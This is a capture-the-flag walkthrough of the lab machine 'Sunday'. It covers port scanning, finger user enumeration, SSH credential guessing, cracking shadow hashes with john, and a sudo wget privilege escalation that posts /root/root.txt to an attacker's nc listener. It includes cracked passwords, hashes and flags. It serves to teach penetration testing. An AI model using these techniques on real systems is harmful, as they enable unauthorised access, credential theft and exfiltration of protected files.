136 - Sunday
============

Mandatory nmap scan:
```bash
❯❯❯ sudo nmap -sS --top-ports 200 10.10.10.76                                                              ⏎
Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-10 18:13 CEST
Nmap scan report for 10.10.10.76
Host is up (0.097s latency).
Not shown: 146 closed ports, 52 filtered ports
PORT    STATE SERVICE
79/tcp  open  finger
111/tcp open  rpcbind

Nmap done: 1 IP address (1 host up) scanned in 409.20 seconds
```

More comprehensive scan:
```bash
❯❯❯ sudo nmap -sS -p- --min-rate 1000 --max-retries 3 10.10.10.76
Nmap scan report for 10.10.10.76
Host is up (0.042s latency).
Not shown: 56215 filtered ports, 9315 closed ports
PORT      STATE SERVICE
79/tcp    open  finger
111/tcp   open  rpcbind
22022/tcp open  unknown
33313/tcp open  unknown
59279/tcp open  unknown
63609/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 246.29 seconds
```

```bash
❯❯❯ sudo nmap -sS -sV -sC -p 22022,33313,59279,63609 10.10.10.76
Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-11 11:58 CEST
Nmap scan report for 10.10.10.76
Host is up (0.096s latency).

PORT      STATE  SERVICE VERSION
22022/tcp open   ssh     SunSSH 1.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 d2:e5:cb:bd:33:c7:01:31:0b:3c:63:d9:82:d9:f1:4e (DSA)
|_  1024 e4:2c:80:62:cf:15:17:79:ff:72:9d:df:8b:a6:c9:ac (RSA)
33313/tcp closed unknown
59279/tcp closed unknown
63609/tcp closed unknown

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.65 seconds
```

Using finger we can reveal a valid user:
```bash
❯❯❯ finger @10.10.10.76
Login       Name               TTY         Idle    When    Where
sunny    sunny                 pts/2            Wed 09:41  10.10.15.209
```

After some tries, SSH to the box is possible using the credentials `sunny:sunday`:
```bash
❯❯❯ ssh -p 22022 sunny@10.10.10.76
Password: 
Last login: Wed Jul 11 09:57:02 2018 from 10.10.15.120
Sun Microsystems Inc.   SunOS 5.11      snv_111b        November 2008
sunny@sunday:~$
```

A useful backup file is present in `/backup`:
```bash
sunny@sunday:/backup$ cat shadow.backup 
mysql:NP:::::::
openldap:*LK*:::::::
webservd:*LK*:::::::
postgres:NP:::::::
svctag:*LK*:6445::::::
nobody:*LK*:6445::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
```

Using john the ripper and the rockyou wordlist cracks the passwords quickly:
```bash
❯❯❯ john --wordlist=/home/jsmith/Desktop/rockyou.txt hashes.txt                                              ⏎
Warning: detected hash type "sha256crypt", but the string is also recognized as "crypt"
Use the "--format=crypt" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (sha256crypt, crypt(3) $5$ [SHA256 128/128 AVX 4x])
Press 'q' or Ctrl-C to abort, almost any other key for status
sunday           (sunny)
cooldude!        (sammy)
1g 0:00:02:33 DONE (2018-07-11 14:43) 0.006504g/s 1325p/s 1325c/s 1325C/s coolster..chs2009
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

We can now log in as sammy and get the user flag:
```bash
❯❯❯ ssh -p 22022 sammy@10.10.10.76                                                                           ⏎
Enter passphrase for key '/home/jsmith/.ssh/id_rsa': 
Password: 
Last login: Tue Apr 24 12:57:03 2018 from 10.10.14.4
Sun Microsystems Inc.   SunOS 5.11      snv_111b        November 2008
sammy@sunday:~$ cat Desktop/user.txt 
a3d9498027ca5187ba1793943ee8a598
```

## Privilege escalation

LinEnum.sh mentions that `sudo` can be run without password. We can list what the user `sammy` can do with sudo as follows:
```bash
sammy@sunday:~$ sudo -l
User sammy may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/wget
```

If we can use wget as root we can as well add a new line to `/etc/passwd`, `/etc/shadow` or `/etc/sudoers` to create a new account, give more rights to our current user or allow `sudo` for all commands with no password. However, to avoid disturbing the other users we can do it in another way.

On the localhost set up a listener:
```bash
❯❯❯ nc -lvp 8123
listening on [any] 8123 ...
```

Then on the box, run the wget command to send the flag as POST request to the listener:
```bash
sammy@sunday:/etc$ sudo wget --post-file=/root/root.txt 10.10.15.186:8123
--14:00:59--  http://10.10.15.186:8123/
           => `index.html'
Connecting to 10.10.15.186:8123... connected.
HTTP request sent, awaiting response... ^C
```

And on the listener we get the flag:
```
10.10.10.76: inverse host lookup failed: Unknown host
connect to [10.10.15.186] from (UNKNOWN) [10.10.10.76] 36609
POST / HTTP/1.0
User-Agent: Wget/1.10.2
Accept: */*
Host: 10.10.15.186:8123
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

fb40fab61d99d37536daeec0d97af9b8
```
